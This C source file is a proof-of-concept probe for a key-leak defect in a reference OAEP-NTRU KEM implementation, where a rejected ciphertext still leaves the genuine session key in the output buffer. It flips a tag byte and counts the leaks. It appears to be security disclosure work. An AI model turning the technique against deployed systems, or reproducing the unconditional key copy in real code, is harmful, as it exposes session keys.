/* reject_leak.c -- Rejection Key-Leak probe on the OAEP-NTRU KEM reference
 * implementation (ICCS NGCC round-1 submission).
 *
 * Companion implementation-level defect (F2). On a REJECTED ciphertext the
 * reference kem_dec still writes the genuine session key to the output buffer
 * ss; only the integer return code signals failure:
 *
 *     memcpy(ss, sigma + NTRUOAEP_SYMBYTES, NTRUOAEP_SSBYTES);  // unconditional
 *     return fail;                                              // != 0 on reject
 *
 * Consequence: an adversary flips one byte of the confirmation tag sigma in a
 * challenge ciphertext. Decapsulation returns a nonzero code (reject), but the
 * buffer ss holds the true challenge key K*. Any caller that reads ss without
 * checking the return code obtains K* in a single query. The specification
 * mandates returning an implicit-rejection / pseudorandom key on failure.
 *
 * This is an implementation defect (the buffer should be overwritten with a
 * pseudorandom value on failure), NOT a scheme break. It links against the
 * UNMODIFIED reference sources and is not part of the submission.
 */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "drng.h"
#include "params.h"
#include "KEM_AlgorithmInstance.h"

DRNG_ctx drng_algorithm;

int main(int argc, char **argv)
{
    int N = argc > 1 ? atoi(argv[1]) : 1000;
    unsigned char seed[48];
    for (int i = 0; i < 48; i++) seed[i] = (unsigned char)(3 * i + 1);
    init_random_number(&drng_algorithm, seed, 48 * 8);

    unsigned char pk[NTRUOAEP_PUBLICKEYBYTES], sk[NTRUOAEP_SECRETKEYBYTES];
    unsigned char ct[NTRUOAEP_CIPHERTEXTBYTES], ctp[NTRUOAEP_CIPHERTEXTBYTES];
    unsigned char Kstar[32], Kdec[32];
    unsigned long long pklen, sklen, sslen, ctlen, dlen;

    int trials = 0, rejected = 0, key_in_ss = 0;

    for (int t = 0; t < N; t++) {
        kem_keygen(pk, &pklen, sk, &sklen);
        kem_enc(pk, pklen, Kstar, &sslen, ct, &ctlen);   /* challenge (ct*, K*) */
        trials++;

        /* Flip one byte of the confirmation tag sigma (first byte of the tag,
         * located at offset NTRUOAEP_POLYBYTES). */
        memcpy(ctp, ct, ctlen);
        ctp[NTRUOAEP_POLYBYTES] ^= 1;

        memset(Kdec, 0, 32);
        int rc = kem_dec(sk, sklen, ctp, ctlen, Kdec, &dlen);
        if (rc != 0) rejected++;                              /* signalled reject */
        if (rc != 0 && memcmp(Kstar, Kdec, 32) == 0) key_in_ss++; /* but ss == K* */
    }

    printf("[reject-leak] set n=%d q=%d trials=%d\n", NTRUOAEP_N, NTRUOAEP_Q, trials);
    printf("[reject-leak] decaps signalled reject (rc!=0) : %d/%d\n", rejected, trials);
    printf("[reject-leak] genuine K* left in ss buffer    : %d/%d\n", key_in_ss, trials);
    printf("[reject-leak] RESULT: %s\n",
           (key_in_ss == trials) ? "KEY-LEAK-ON-REJECT confirmed (ss not zeroized)"
                                  : "not confirmed");
    return (key_in_ss == trials) ? 0 : 1;
}
